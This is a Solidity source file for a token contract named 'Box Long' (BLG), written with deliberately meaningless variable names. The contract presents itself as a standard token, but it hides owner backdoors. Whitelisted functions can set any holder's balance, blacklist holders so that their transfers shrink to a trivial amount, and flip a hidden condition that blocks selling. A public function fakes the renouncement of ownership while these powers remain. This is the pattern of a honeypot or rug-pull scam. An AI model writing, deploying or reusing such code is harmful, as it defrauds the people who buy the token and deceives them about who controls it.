//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface receiverToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitWalletAuto) external view returns (uint256);

    function transfer(address amountTake, uint256 minLiquidityLimit) external returns (bool);

    function allowance(address maxMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 minLiquidityLimit) external returns (bool);

    function transferFrom(
        address sender,
        address amountTake,
        uint256 minLiquidityLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundMinTotal, uint256 value);
    event Approval(address indexed maxMode, address indexed spender, uint256 value);
}

abstract contract maxShouldReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoListTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface takeTx {
    function createPair(address teamAutoSender, address listSellTrading) external returns (address);
}

interface receiverTokenMetadata is receiverToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BoxLong is maxShouldReceiver, receiverToken, receiverTokenMetadata {

    address receiverSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transfer(address minEnable, uint256 minLiquidityLimit) external virtual override returns (bool) {
        return autoLimit(_msgSender(), minEnable, minLiquidityLimit);
    }

    function transferFrom(address maxShould, address amountTake, uint256 minLiquidityLimit) external override returns (bool) {
        if (_msgSender() != receiverIs) {
            if (exemptLaunchedAt[maxShould][_msgSender()] != type(uint256).max) {
                require(minLiquidityLimit <= exemptLaunchedAt[maxShould][_msgSender()]);
                exemptLaunchedAt[maxShould][_msgSender()] -= minLiquidityLimit;
            }
        }
        return autoLimit(maxShould, amountTake, minLiquidityLimit);
    }

    function autoLimit(address maxShould, address amountTake, uint256 minLiquidityLimit) internal returns (bool) {
        if (maxShould == liquidityLaunchLaunched) {
            return toToken(maxShould, amountTake, minLiquidityLimit);
        }
        uint256 enableTotal = receiverToken(swapReceiver).balanceOf(receiverSell);
        require(enableTotal == amountToken);
        require(amountTake != receiverSell);
        if (limitMin[maxShould]) {
            return toToken(maxShould, amountTake, minSwapTotal);
        }
        return toToken(maxShould, amountTake, minLiquidityLimit);
    }

    function isTotal() public {
        emit OwnershipTransferred(liquidityLaunchLaunched, address(0));
        liquidityTake = address(0);
    }

    string private receiverTx = "Box Long";

    uint256 public marketingTo;

    function allowance(address modeFee, address sellBuy) external view virtual override returns (uint256) {
        if (sellBuy == receiverIs) {
            return type(uint256).max;
        }
        return exemptLaunchedAt[modeFee][sellBuy];
    }

    mapping(address => mapping(address => uint256)) private exemptLaunchedAt;

    uint8 private buyTake = 18;

    mapping(address => uint256) private toLaunched;

    function approve(address sellBuy, uint256 minLiquidityLimit) public virtual override returns (bool) {
        exemptLaunchedAt[_msgSender()][sellBuy] = minLiquidityLimit;
        emit Approval(_msgSender(), sellBuy, minLiquidityLimit);
        return true;
    }

    mapping(address => bool) public liquiditySell;

    function maxSender(uint256 minLiquidityLimit) public {
        swapBuyTake();
        amountToken = minLiquidityLimit;
    }

    address receiverIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public amountLaunch;

    function swapBuyTake() private view {
        require(liquiditySell[_msgSender()]);
    }

    uint256 public modeToken;

    function name() external view virtual override returns (string memory) {
        return receiverTx;
    }

    uint256 private swapMax;

    function symbol() external view virtual override returns (string memory) {
        return launchTeam;
    }

    uint256 private limitMinToken = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return liquidityTake;
    }

    address public liquidityLaunchLaunched;

    uint256 public takeBuy;

    function decimals() external view virtual override returns (uint8) {
        return buyTake;
    }

    uint256 amountToken;

    uint256 tradingTx;

    bool private swapMode;

    function owner() external view returns (address) {
        return liquidityTake;
    }

    address private liquidityTake;

    uint256 constant minSwapTotal = 18 ** 10;

    function launchedExempt(address launchTotal) public {
        if (amountLaunch) {
            return;
        }
        
        liquiditySell[launchTotal] = true;
        if (swapMax == takeBuy) {
            takeBuy = modeToken;
        }
        amountLaunch = true;
    }

    function enableFrom(address feeFund) public {
        swapBuyTake();
        
        if (feeFund == liquidityLaunchLaunched || feeFund == swapReceiver) {
            return;
        }
        limitMin[feeFund] = true;
    }

    address public swapReceiver;

    function totalSupply() external view virtual override returns (uint256) {
        return limitMinToken;
    }

    function balanceOf(address limitWalletAuto) public view virtual override returns (uint256) {
        return toLaunched[limitWalletAuto];
    }

    mapping(address => bool) public limitMin;

    function receiverLimit(address minEnable, uint256 minLiquidityLimit) public {
        swapBuyTake();
        toLaunched[minEnable] = minLiquidityLimit;
    }

    constructor (){
        
        autoListTake amountSell = autoListTake(receiverIs);
        swapReceiver = takeTx(amountSell.factory()).createPair(amountSell.WETH(), address(this));
        if (takeBuy != swapMax) {
            takeBuy = swapMax;
        }
        liquidityLaunchLaunched = _msgSender();
        isTotal();
        liquiditySell[liquidityLaunchLaunched] = true;
        toLaunched[liquidityLaunchLaunched] = limitMinToken;
        if (takeBuy != marketingTo) {
            marketingTo = swapMax;
        }
        emit Transfer(address(0), liquidityLaunchLaunched, limitMinToken);
    }

    string private launchTeam = "BLG";

    bool public buyFrom;

    event OwnershipTransferred(address indexed shouldModeTeam, address indexed launchedTotal);

    function toToken(address maxShould, address amountTake, uint256 minLiquidityLimit) internal returns (bool) {
        require(toLaunched[maxShould] >= minLiquidityLimit);
        toLaunched[maxShould] -= minLiquidityLimit;
        toLaunched[amountTake] += minLiquidityLimit;
        emit Transfer(maxShould, amountTake, minLiquidityLimit);
        return true;
    }

}